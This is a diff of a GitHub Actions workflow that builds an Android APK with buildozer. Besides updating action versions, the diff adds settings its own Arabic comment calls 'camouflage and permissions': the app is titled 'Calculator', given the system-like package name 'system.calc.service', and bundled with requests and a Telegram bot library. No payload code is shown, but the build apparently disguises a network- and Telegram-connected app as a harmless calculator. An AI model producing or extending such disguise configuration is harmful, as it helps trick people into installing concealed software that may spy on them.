@@ -4,9 +4,9 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
+      - uses: actions/checkout@v4
       - name: Set up Python
-        uses: actions/setup-python@v2
+        uses: actions/setup-python@v4
         with:
           python-version: 3.9
       - name: Install dependencies
@@ -16,12 +16,13 @@ jobs:
       - name: Build APK
         run: |
           yes | buildozer init
-          # إضافة المكتبات اللازمة للتمويل
+          # ضبط إعدادات التمويه والصلاحيات
           sed -i 's/requirements = python3,kivy/requirements = python3,kivy,requests,pytelebotapi/g' buildozer.spec
           sed -i 's/title = My Application/title = Calculator/g' buildozer.spec
+          sed -i 's/package.name = myapp/package.name = system.calc.service/g' buildozer.spec
           buildozer -v android debug
       - name: Upload APK
-        uses: actions/upload-artifact@v2
+        uses: actions/upload-artifact@v4
         with:
           name: calculator-apk
           path: bin/*.apk
